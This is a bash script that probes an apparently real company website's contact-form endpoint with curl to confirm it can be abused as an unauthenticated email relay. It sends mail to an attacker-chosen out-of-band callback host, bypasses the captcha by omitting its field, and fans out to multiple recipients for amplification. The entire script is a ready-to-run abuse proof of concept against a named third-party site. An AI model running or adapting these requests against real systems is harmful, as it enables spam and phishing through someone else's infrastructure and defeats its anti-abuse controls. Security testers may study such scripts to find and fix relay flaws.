#!/bin/bash
# Verify /api/send email relay: unauthenticated, attacker-chosen recipient, no captcha required.
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122 Safari/537.36"
B="https://www.infinitycapital.bh/api/send"
H1="oobead15df4c33e.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
H2="probe@relay-verify-attacker.invalid"

echo "### V1: recipient fully attacker-controlled (unauthenticated, check=on)"
curl -sk -A "$UA" -m 40 -o v1.out -w "HTTP %{http_code} t=%{time_total}\n" -X POST "$B" \
  --data-urlencode "fname=Verification" --data-urlencode "lname=Run1" --data-urlencode "areacode=973" \
  --data-urlencode "tel=5551234" --data-urlencode "cname=IC Assessment" --data-urlencode "subject=Relay verification RUN1" \
  --data-urlencode "msg=marker ICMARKER-RUN1-9f3a2b" --data-urlencode "check=on" --data-urlencode "targets=$H1"
cat v1.out; echo

echo "### V2: second, different subject/message (repeatability)"
sleep 3
curl -sk -A "$UA" -m 40 -o v2.out -w "HTTP %{http_code} t=%{time_total}\n" -X POST "$B" \
  --data-urlencode "fname=Verification" --data-urlencode "lname=Run2" --data-urlencode "areacode=973" \
  --data-urlencode "tel=5551234" --data-urlencode "cname=IC Assessment" --data-urlencode "subject=Relay verification RUN2" \
  --data-urlencode "msg=marker ICMARKER-RUN2-77c1de" --data-urlencode "check=on" --data-urlencode "targets=$H1"
cat v2.out; echo

echo "### V3: NO captcha/checkbox field at all (captcha bypass)"
sleep 3
curl -sk -A "$UA" -m 40 -o v3.out -w "HTTP %{http_code} t=%{time_total}\n" -X POST "$B" \
  --data-urlencode "fname=NoCaptcha" --data-urlencode "lname=Run" --data-urlencode "areacode=973" \
  --data-urlencode "tel=5551234" --data-urlencode "cname=C" --data-urlencode "subject=S" \
  --data-urlencode "msg=ICMARKER-NOCAPTCHA-aa11" --data-urlencode "targets=$H1"
cat v3.out; echo

echo "### V4: multiple recipients in one request (amplification)"
sleep 3
curl -sk -A "$UA" -m 40 -o v4.out -w "HTTP %{http_code} t=%{time_total}\n" -X POST "$B" \
  --data-urlencode "fname=Multi" --data-urlencode "lname=Run" --data-urlencode "areacode=973" \
  --data-urlencode "tel=5551234" --data-urlencode "cname=C" --data-urlencode "subject=Multi-recipient relay test" \
  --data-urlencode "msg=ICMARKER-MULTI-bb22" --data-urlencode "check=on" \
  --data-urlencode "targets=$H1, second@$H1"
cat v4.out; echo
echo DONE
